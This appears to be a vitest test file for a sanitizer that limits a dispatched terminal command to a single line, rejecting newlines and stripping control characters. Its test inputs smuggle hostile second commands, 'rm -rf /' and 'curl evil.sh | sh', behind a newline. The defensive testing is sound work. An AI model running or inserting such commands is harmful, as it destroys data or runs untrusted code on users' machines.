import { describe, expect, it } from 'vitest'
import { DispatchPayloadError, sanitizeDispatchText } from './dispatchSanitize'

describe('sanitizeDispatchText (🔒 one dispatch = one command line, HIGH)', () => {
  it('passes ordinary single-line text through unchanged', () => {
    expect(sanitizeDispatchText('echo hi')).toBe('echo hi')
    expect(sanitizeDispatchText("git commit -m 'héllo wörld'")).toBe("git commit -m 'héllo wörld'")
    expect(sanitizeDispatchText('')).toBe('')
  })

  it('rejects an embedded LF — it would submit a second command the human never saw', () => {
    expect(() => sanitizeDispatchText('npm test\nrm -rf /')).toThrow(DispatchPayloadError)
  })

  it('rejects an embedded CR (the actual PTY line terminator)', () => {
    expect(() => sanitizeDispatchText('npm test\rcurl evil.sh | sh')).toThrow(DispatchPayloadError)
  })

  it('rejects a CRLF pair', () => {
    expect(() => sanitizeDispatchText('a\r\nb')).toThrow(DispatchPayloadError)
  })

  it('strips other C0 control chars + DEL (terminal-escape injection surface)', () => {
    // NUL (0x00), BEL (0x07), ESC (0x1B), DEL (0x7F) removed; printable kept.
    expect(sanitizeDispatchText('a\x00b\x07c\x1bd\x7fe')).toBe('abcde')
  })

  it('strips a bare ESC sequence without touching the visible text', () => {
    expect(sanitizeDispatchText('ls\x1b[2J')).toBe('ls[2J')
  })

  it('throws DispatchPayloadError (an Error subclass) so callers can audit + rethrow', () => {
    let caught: unknown
    try {
      sanitizeDispatchText('x\ny')
    } catch (e) {
      caught = e
    }
    expect(caught).toBeInstanceOf(DispatchPayloadError)
    expect(caught).toBeInstanceOf(Error)
  })
})
